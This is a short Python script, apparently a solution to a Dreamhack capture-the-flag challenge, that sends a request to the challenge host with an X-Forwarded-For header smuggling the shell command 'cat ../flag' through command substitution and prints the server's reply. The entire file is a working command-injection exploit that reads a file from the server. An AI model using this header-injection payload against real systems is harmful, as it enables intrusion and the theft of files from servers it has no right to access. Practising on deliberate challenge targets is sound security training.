from requests import get

url = "http://host3.dreamhack.games:12811"

r = get(url, headers={"X-Forwarded-For": '"$(cat ../flag)"'})
r.raise_for_status()
print(r.text)

